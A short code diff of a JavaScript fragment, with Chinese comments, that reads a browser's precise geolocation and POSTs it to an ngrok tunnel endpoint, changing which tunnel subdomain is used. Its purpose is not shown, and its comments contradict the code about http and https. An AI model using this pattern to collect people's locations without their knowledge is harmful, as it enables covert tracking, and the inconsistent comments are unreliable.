@@ -94,8 +94,10 @@
             const longitude = position.coords.longitude;
             const accuracy = position.coords.accuracy;
             
-            // 使用你的实际 ngrok 地址
-            fetch('https://2ff3-2409-8a60-8422-e60-cfe-b60a-22e5-908b.ngrok-free.app/api/location', {
+            // 修改为 HTTP 地址
+            fetch('https://02f3-2409-8a60-8422-e60-cfe-b60a-22e5-908b.ngrok-free.app/api/location', {  // 如果是本地测试
+            // 或者使用 ngrok 的地址（不要带 https://）
+            // fetch('http://2ff3-2409-8a60-8422-e60-cfe-b60a-22e5-908b.ngrok-free.app/api/location', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
